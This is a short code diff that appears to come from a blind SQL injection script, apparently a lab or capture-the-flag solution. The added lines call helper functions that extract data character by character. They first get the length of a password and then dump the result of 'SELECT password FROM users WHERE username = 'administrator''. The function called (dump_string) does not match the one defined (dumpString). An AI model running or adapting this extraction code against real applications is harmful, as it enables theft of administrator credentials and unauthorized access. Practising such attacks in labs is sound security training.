@@ -39,3 +39,7 @@ def dumpString(q, length):
                 c |= 2**p
         val += chr(c)
     return val
+
+length=dump_length("password")
+print(length)
+print(dump_string("SELECT password FROM users WHERE username = 'administrator'", length))
